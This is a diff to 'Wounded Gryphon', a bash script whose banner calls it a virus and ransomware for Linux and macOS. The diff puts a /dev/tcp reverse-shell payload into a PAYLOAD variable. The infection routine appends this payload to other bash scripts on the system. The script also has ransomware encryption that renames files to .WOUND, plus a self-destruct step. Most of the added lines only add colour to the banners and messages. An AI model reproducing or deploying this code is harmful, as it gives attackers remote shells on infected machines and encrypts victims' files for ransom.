@@ -12,7 +12,7 @@
 #   \    \_\  |  | \/\___  |  |_> |   Y  (  <_> |   |  \ ----------
 #    \______  |__|   / ____|   __/|___|  /\___\/|___|  / ----------
 #       /   \/       \/    |__|        \/      \     \/ ---------
-#      / Wonded Gryphon v3.6  ______----------- # ---------------
+#      / Wonded Gryphon v3.8  ______----------- # ---------------
 #     #          _______,---'__,---' ---------------------------
 #            _,-'---_---__,---' -----------------------------
 #     /_ #   (,  ---____', --------------------------------
@@ -40,44 +40,130 @@ CAT=$(cat "$me")
 
 FLAG="#arrow"
 
-VERSION="v3.6"
+VERSION="v3.8"
 
 FLAG="$1"
 
-PAYLOAD="" # Choose payload when infecting
+# ------------------------------------------------------------------
+
+# String you want to append to sh file. Example: reverse tcp bash (metasploit).
+# Responds to:
+# IP: 192.168.1.88
+# PORT: 8888
+
+PAYLOAD="0<&205-;exec 205<>/dev/tcp/192.168.1.88/8888;sh <&205 >&205 2>&205" # Choose payload when infecting
+
+# -------------------------------------------------------------------
 
 MAXINFECTCOUNT=50 # Maximum infected files
 
-CHOOSE_BANNER
+# Colors and special caracters
 
-# All THE BANNERS
+# Reset
+NC='\033[0m'       # Text Reset
+
+BLINK=$(tput blink)
+
+# Regular Colors
+Black='\033[0;30m'        # Black
+Red='\033[0;31m'          # Red
+Green='\033[0;32m'        # Green
+Yellow='\033[0;33m'       # Yellow
+Blue='\033[0;34m'         # Blue
+Purple='\033[0;35m'       # Purple
+Cyan='\033[0;36m'         # Cyan
+White='\033[0;37m'        # White
+
+# Bold
+BBlack='\033[1;30m'       # Black
+BRed='\033[1;31m'         # Red
+BGreen='\033[1;32m'       # Green
+BYellow='\033[1;33m'      # Yellow
+BBlue='\033[1;34m'        # Blue
+BPurple='\033[1;35m'      # Purple
+BCyan='\033[1;36m'        # Cyan
+BWhite='\033[1;37m'       # White
+
+# Underline
+UBlack='\033[4;30m'       # Black
+URed='\033[4;31m'         # Red
+UGreen='\033[4;32m'       # Green
+UYellow='\033[4;33m'      # Yellow
+UBlue='\033[4;34m'        # Blue
+UPurple='\033[4;35m'      # Purple
+UCyan='\033[4;36m'        # Cyan
+UWhite='\033[4;37m'       # White
+
+# Background
+On_Black='\033[40m'       # Black
+On_Red='\033[41m'         # Red
+On_Green='\033[42m'       # Green
+On_Yellow='\033[43m'      # Yellow
+On_Blue='\033[44m'        # Blue
+On_Purple='\033[45m'      # Purple
+On_Cyan='\033[46m'        # Cyan
+On_White='\033[47m'       # White
+
+# High Intensity
+IBlack='\033[0;90m'       # Black
+IRed='\033[0;91m'         # Red
+IGreen='\033[0;92m'       # Green
+IYellow='\033[0;93m'      # Yellow
+IBlue='\033[0;94m'        # Blue
+IPurple='\033[0;95m'      # Purple
+ICyan='\033[0;96m'        # Cyan
+IWhite='\033[0;97m'       # White
+
+# Bold High Intensity
+BIBlack='\033[1;90m'      # Black
+BIRed='\033[1;91m'        # Red
+BIGreen='\033[1;92m'      # Green
+BIYellow='\033[1;93m'     # Yellow
+BIBlue='\033[1;94m'       # Blue
+BIPurple='\033[1;95m'     # Purple
+BICyan='\033[1;96m'       # Cyan
+BIWhite='\033[1;97m'      # White
+
+# High Intensity backgrounds
+On_IBlack='\033[0;100m'   # Black
+On_IRed='\033[0;101m'     # Red
+On_IGreen='\033[0;102m'   # Green
+On_IYellow='\033[0;103m'  # Yellow
+On_IBlue='\033[0;104m'    # Blue
+On_IPurple='\033[0;105m'  # Purple
+On_ICyan='\033[0;106m'    # Cyan
+On_IWhite='\033[0;107m'   # White
+
+# List made by Shakiba Moshiri
+
+# All the BANNERS
 
 function banner1() {
    
-   echo "                _  #       _ "
-   echo "              _/|  \ _   |\_ "
-   echo "            _/_ |   \|\\ | _\ "
-   echo "          _/_/| /  /   \|\ |\_\_     # "
-   echo "        _/_/  |/  /  _  \/\|  \_\_  / "
-   echo "      _/_/    ||  | | \*/ ||    \_\/   "
-   echo "     /_/  | | |\  | \_ /  /| | |  \_\   # "
-   echo "    //    ||| | \_/   \__/ | |||    \\ / "
-   echo "   // __| ||\  \ ||    || /  /|| |__ \/ "
-   echo "  //_/ \|||| \/\\||    ||//\/ ||||/ \_\\ "
-   echo " ///    \\\\/   /()    ()\   \////    \\\ "
-   echo " |/      \/    |    |    |     \/      \| "
-   echo "              /_|  | |_  \  # "
-   echo "              ///_| |_||\_ \/ "
-   echo "              |//||/||\/||\/       WOUNDED GRYPHON $VERSION "
-   echo "               / || ||/||/\/    "
-   echo "                 {}/|| {}        "
-   echo "                    ||            "
-   echo "                    () "
+   echo -e "$Blue                _  #       _ $NC"
+   echo -e "$Blue              _/|  \ _   |\_ $NC"
+   echo -e "$Blue            _/_ |   \|\\ | _\ $NC"
+   echo -e "$Blue          _/_/| /  /   \|\ |\_\_     # $NC"
+   echo -e "$Blue        _/_/  |/  /  _  \/\|  \_\_  / $NC"
+   echo -e "$Blue      _/_/    ||  | | \*/ ||    \_\/   $NC"
+   echo -e "$Blue     /_/  | | |\  | \_ /  /| | |  \_\   # $NC"
+   echo -e "$Blue    //    ||| | \_/   \__/ | |||    \\ / $NC"
+   echo -e "$Blue   // __| ||\  \ ||    || /  /|| |__ \/ $NC"
+   echo -e "$Blue  //_/ \|||| \/\\||    ||//\/ ||||/ \_\\ $NC"
+   echo -e "$Blue ///    \\\\/   /()    ()\   \////    \\\ $NC"
+   echo -e "$Blue |/      \/    |    |    |     \/      \| $NC"
+   echo -e "$Blue              /_|  | |_  \  # $NC"
+   echo -e "$Blue              ///_| |_||\_ \/ $NC"
+   echo -e "$Blue              |//||/||\/||\/       WOUNDED GRYPHON $VERSION $NC"
+   echo -e "$Blue               / || ||/||/\/    $NC"
+   echo -e "$Blue                 {}/|| {}        $NC"
+   echo -e "$Blue                    ||            $NC"
+   echo -e "$Blue                    () $NC"
 }
 
 function banner2() {
 
-   echo "
+   echo -e "$BLINK $Cyan
                 ++01100101 01110101++             =ඏ=             ++10101110 10100110++
               +011100110110   01001111000      0♢0Ŧ0♢0     00011110010   011011001110+
           +0110010001100101 0110000101100100   000卄000   0010011010000110 1010011000100110+
@@ -94,13 +180,13 @@ function banner2() {
                                                 10 ∴ 01
                                                 10 ∵ 01
                                                 00.00
-                                                  : :
-                  Do you got what it takes? 
-                            https://bit.ly/3b83sD9 "
+                                                  : : $NC
+                 $BBlue Do you got what it takes? $NC
+                           $BWhite https://bit.ly/3b83sD9 $NC"
 }
 
 function banner3() {
-   echo "
+   echo -e " $Cyan
                          # ------------------------------------------
           __      __      \ -------------- .___ ------- .___ --------
          /  \    /  \____  \_ __  ____   __| _/____   __| _/ ---------
@@ -113,12 +199,12 @@ function banner3() {
          \    \_\  |  | \/\___  |  |_> |   Y  (  <_> |   |  \ ----------
           \______  |__|   / ____|   __/|___|  /\___\/|___|  / ----------
              /   \/       \/    |__|        \/      \     \/ ---------
-            / Wonded Gryphon $VERSION  ----------------- # ---------------
-           # ---------------------------------------------------------- "
+            /$NC $BBlue Wonded Gryphon $VERSION $NC $Cyan---------------- # ---------------
+           # ---------------------------------------------------------- $NC"
 }
 
 function banner4() {
-   echo "
+   echo -e "$Blue
                    _________
                   / ======= \
                  / __________\
@@ -129,50 +215,64 @@ function banner4() {
                 \=____________/                        )
                 / ........... \   WOUNDED GRYPHON     /
                / ::::::::::::: \      $VERSION        =D-'
-              (_________________) "
+              (_________________) $NC"
 }
 
 function banner_text() {
    
-   echo "
+   echo -e " $UBlue
    
    # Created by TheG0df2ther a MalDev101 project
    # This is only an experiment but it can be dangerous.
    # I am not responsible for the damage.
    # This is a virus/ransomware that works on unix systems with bash installed.
    # Tested on Linux (Ubuntu, Debian) and MacOS (OSX)
-   #
-   # If virus mode:
-   #
+   # $NC
+   $BBlue # If virus mode: $NC
+   $UBlue #
    # Check if files are written in bash then start infecting them.
    # The virus ignores non bash scripts and already infected files
-   #
-   # If ransomware mode:
-   #
-   # Encrypt files in Desktop, Videos ... "
+   # $NC
+   $BBlue # If ransomware mode: $NC
+   $UBlue #
+   # Encrypt files in Desktop, Videos ... $NC"
 }
 
 function error() {
 
-   echo "_______________________________ ________ __________._."
-   echo "\_   _____/\______   \______   \\_____  \\______   \ |"
-   echo " |    __)_  |       _/|       _/ /   |   \|       _/ |"
-   echo " |        \ |    |   \|    |   \/    |    \    |   \\|"
-   echo "/_______  / |____|_  /|____|_  /\_______  /____|_  /__"
-   echo "        \/         \/        \/         \/       \/ \/"
-   echo "                                                      "
+   echo -e "$Red $BLINK _______________________________ ________ __________._. $NC"
+   echo -e "$Red $BLINK \_   _____/\______   \______   \\_____  \\______   \ | $NC"
+   echo -e "$Red $BLINK  |    __)_  |       _/|       _/ /   |   \|       _/ | $NC"
+   echo -e "$Red $BLINK  |        \ |    |   \|    |   \/    |    \    |   \\| $NC"
+   echo -e "$Red $BLINK /_______  / |____|_  /|____|_  /\_______  /____|_  /__ $NC"
+   echo -e "$Red $BLINK         \/         \/        \/         \/       \/ \/ $NC"
+
+   echo -e "     "
 }
 
 function help() {
 
-   echo " Available opions: "
-   echo " "
-   echo " Show this page: --help"
-   echo " Infect all bash files on the system: --infect"
-   echo " Encrypt files in Desktop, Videos ...: --encrypt"
-   echo " Self destruct when done: (--infect, --encrypt) --self-destruct "
-   echo " Unencrypt files: --unencrypt "
-   echo " Uninfect system: --uninfect "
+   echo -e "$BCyan Available opions: $NC"
+   echo -e " "
+   echo -e "$UCyan Show this page: --help $NC"
+   echo -e "$UCyan Infect all bash files on the system: --infect $NC"
+   echo -e "$UCyan Encrypt files in Desktop, Videos ...: --encrypt $NC"
+   echo -e "$UCyan Self destruct when done: (--infect, --encrypt) --self-destruct $NC"
+   echo -e "$UCyan Unencrypt files: --unencrypt $NC"
+   echo -e "$UCyan Uninfect system: --uninfect $NC"
+
+# Cleanup function
+
+function cleanup() {
+   
+   echo "#!/bin/bash" > Gryphon.sh
+   echo "sleep 8" >> Gryphon.sh
+   echo "sudo mv $ME /dev/null" >> Gryphon.sh
+   chmod 755 Gryphon.sh 
+   ./Gryphon
+   exit
+}
+
 
 # Virus mode
 
@@ -242,7 +342,7 @@ function infect() {
    # IP: 192.168.1.88
    # PORT: 8888
 
-   echo "0<&205-;exec 205<>/dev/tcp/192.168.1.88/8888;sh <&205 >&205 2>&205" >> "$LIST"
+   echo "$PAYLOAD" >> "$LIST"
    echo "$FLAG" >> "$LIST"
 
    INFECTCOUNT=$(($INFECTCOUNT + 1))
@@ -402,16 +502,6 @@ function encryptmusic() {
       mv -- "$f" "${f%.cpt}.WOUND"
    done
 
-}
-
-function cleanup() {
-   
-   echo "#!/bin/bash" > Gryphon.sh
-   echo "sleep 8" >> Gryphon.sh
-   echo "sudo mv $ME /dev/null" >> Gryphon.sh
-   chmod 755 Gryphon.sh 
-   ./Gryphon
-   exit
 }
 
 function ransom_start() {
@@ -633,6 +723,9 @@ function unencrypt() {
    
 }
 
+# Start
+
+CHOOSE_BANNER
 
 if [ "$FLAG" == "--infect" ]
 
@@ -664,14 +757,14 @@ elif [ $# -le 0 ]
 then
    error
    echo "   "
-   echo "No arguments specified!"
-   echo "Use --help to display options"
+   echo -e  "$Red No arguments specified! $NC"
+   echo -e "$Red Use$NC $BRed--help$NC $Red to display options.$NC"
 
 else
    error
    echo "   "
-   echo "No such argument available!"
-   echo "Use --help to display options" 
+   echo -e "$Red No such argument available!$NC"
+   echo -e "$Red Use$NC $BRed--help$NC $Red to display options.$NC" 
 
 fi
 
